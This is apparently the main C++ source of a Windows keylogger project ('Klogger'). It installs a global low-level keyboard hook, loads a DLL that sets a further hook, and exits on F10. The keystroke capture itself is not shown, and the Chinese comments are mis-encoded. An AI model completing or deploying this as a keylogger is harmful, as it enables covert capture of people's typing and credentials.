#include "stdafx.h"
#include "Klogger.h"
#include "console.h"

#define KLOG_DEBUG	//console �ĵ��Կ���

typedef VOID(_stdcall* LPFNDLLFUNC)(VOID);
typedef INT(_stdcall* LPFNDLLFUNC1)(INT, INT);

static HHOOK hKBHook = 0;
static LPFNDLLFUNC lpfnDllUnHook = 0;
static 	HMODULE hHookDll;
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);





int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{	

	TCHAR currentDir[MAX_PATH];
	std::exception mException;

#ifdef KLOG_DEBUG
	console_init();
#endif

	

	if (!(hKBHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardProc, NULL, 0)))
	{
		MessageBox(NULL, L"Failed to install KB hook!", L"Error", MB_ICONERROR);
	}

	GetCurrentDirectory(MAX_PATH, currentDir);	//get��ǰ��·��
	DebugPrint(currentDir);

	try
	{
		hHookDll = LoadLibrary(L"./KDLL.dll");

		if (hHookDll)
		{
			DebugPrint(L"DLL loaded! \n");
		
			LPFNDLLFUNC lpfnDllSetHook = (LPFNDLLFUNC) GetProcAddress(hHookDll, "fnSetKbHook");
			lpfnDllUnHook = (LPFNDLLFUNC) GetProcAddress(hHookDll, "fnRemoveKbHook");
			
			DebugPrint(L"%d", (int)lpfnDllUnHook);
			//INT(_stdcall *appFunc)(INT, INT); //���ﶨ��һ������ָ�룬Ҳ����ͨ�� typedef ����������
			//��ö�̬�⺯��ָ��
			//(FARPROC&)appFunc = GetProcAddress(hHookDll, LPCSTR(MAKEINTRESOURCE(1)));

			if (lpfnDllSetHook)
			{
				lpfnDllSetHook();
			}
			else
			{
				DebugPrint(L"invalid Function Pointer!");
				throw mException;
			}
		}
		else
		{
			//INT eno = GetLastError();
			throw mException;
			//MessageBox(NULL, L"warning", L"Load DLL File FAILED!", MB_OK);
		}

	}
	catch (const std::exception& e)
	{	
		USES_CONVERSION;

		TCHAR textBuf[64];
		
		FreeLibrary(hHookDll);
		//wsprintf(textBuf, L"Load DLL FAILED! \n%s", CA2W(e.what()));

		MessageBox(GetDesktopWindow(), L"Load DLL FAILED", L"warning",  MB_OK);
	}
				

	MSG msg;	//����Ӧ������ (���־������DLL ���ᱻ����)
	while (GetMessage(&msg, 0, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	};
	return msg.wParam;

#ifndef KLOG_DEBUG
#endif
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			switch (kbdStruct.vkCode)
			{
			case VK_F10:				//�����˳���ݼ�
				
				//MessageBox(GetDesktopWindow(), L"F10", L"info", NULL);
				DebugPrint(L"%d", (int)lpfnDllUnHook);

				lpfnDllUnHook();
				FreeLibrary(hHookDll);	//�����ͷ� DLL �ļ�

				exit(0);
				break;
			default:
				break;
			}
			
		}
	}
	
	
	return CallNextHookEx(hKBHook, nCode, wParam, lParam); //Ҫ����Ϣ������һ������ ����Ȼ���̾�û���ˣ�

}

